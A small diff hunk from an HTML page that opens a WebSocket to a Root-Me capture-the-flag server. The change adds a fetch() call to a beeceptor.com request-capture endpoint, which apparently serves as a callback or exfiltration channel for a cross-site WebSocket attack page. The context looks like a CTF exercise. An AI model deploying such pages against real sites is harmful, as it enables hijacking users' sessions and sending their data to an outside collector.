@@ -46,6 +46,7 @@
 <body>
     <p id="color">#000000</p>
     <script>
+        fetch('https://websocket.free.beeceptor.com')
         websocket = new WebSocket('ws://ctf15.root-me.org/ws')
         websocket.onopen = start
         websocket.onmessage = handleReply
